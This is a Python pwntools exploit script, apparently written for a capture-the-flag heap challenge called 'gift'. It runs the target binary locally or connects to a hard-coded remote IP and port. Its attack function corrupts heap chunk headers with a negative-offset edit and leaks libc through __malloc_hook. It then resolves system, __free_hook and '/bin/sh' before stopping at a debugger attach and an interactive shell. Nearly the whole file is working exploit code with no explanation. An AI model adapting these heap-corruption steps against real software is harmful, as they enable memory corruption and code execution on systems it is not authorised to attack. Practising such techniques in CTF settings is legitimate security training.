# -*- encoding: utf-8 -*-
from multiprocessing import freeze_support
import sys 
import os 
import requests
from pwn import * 
binary = './gift'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '182.92.74.66'
    port = '14937'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(type , text = 'a\n'):
    cmd(2)
    sla('gift:' , type)
    sa('your gift!' , text)

def edit(idx , text):
    cmd(5)
    sla('index?' , idx)
    sa('How much?' , text)

def show(idx ):
    cmd(4)
    sla('index?' , idx)

def delete(idx ):
    cmd(3)
    sla('index?' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(1 , flat(0 , 0x421)*(0xf0/8))
    add(1 , flat(0 , 0x421)*(0xf0/8))
    add(1 , flat(0 , 0x421)*(0xf0/8))
    add(1 , flat(0 , 0x421)*(0xf0/8))
    add(1 , flat(0 , 0x21)*(0xf0/8))

    delete(0)
    delete(1)

    edit(1 , -0xb0 )
    add(1)
    add(1)
    delete(6)
    add(2)
    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)


    dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   gift.py
@Time    :   2022/08/17 11:33:26
@Author  :   Niyah 
'''